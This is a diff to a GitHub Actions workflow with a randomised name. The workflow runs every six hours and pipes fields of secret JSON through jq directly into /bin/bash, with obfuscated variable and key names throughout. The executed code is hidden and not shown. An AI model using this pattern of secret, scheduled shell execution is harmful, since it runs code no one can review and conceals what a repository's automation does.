@@ -3,18 +3,29 @@ name: maixiaoqi7465
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 1/6 * * *'
-jobs:  # 16667
+    - cron: '3 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: maixiaoqi7465
         env:
-          oq95621: ${{ secrets.oq95621 }}
+          pdxe83: ${{ secrets.pdxe83 }}
         run: |
-          echo $oq95621 | jq -r .xwql9393 | /bin/bash
-          echo $kwfpm8 | jq -r .d31096 | /bin/bash
-          echo $fwe7 | jq -r .jpe857 | /bin/bash
-          echo $q98 | jq -r .ricw511 | /bin/bash
+          echo $pdxe83 | jq -r .gif6384 | /bin/bash
+          echo $cqeh608 | jq -r .g8 | /bin/bash
+          echo $h3371 | jq -r .pu8 | /bin/bash
+          echo $p65943 | jq -r .ux9 | /bin/bash
+          echo $cvot32027 | jq -r .upbwq4600 | /bin/bash
+          echo $ug267 | jq -r .yaiud315 | /bin/bash
+          echo $g880 | jq -r .mn41669 | /bin/bash
+          echo $b1 | jq -r .yvzw0118 | /bin/bash
+          echo $wxavg423 | jq -r .yfg9 | /bin/bash
+          echo $fx81 | jq -r .wxez8744 | /bin/bash
+          echo $jw10 | jq -r .ranex8371 | /bin/bash
+          echo $x46 | jq -r .bevn2 | /bin/bash
+          echo $h6347 | jq -r .doxhj010 | /bin/bash
+          echo $nin81 | jq -r .mh3599 | /bin/bash
 
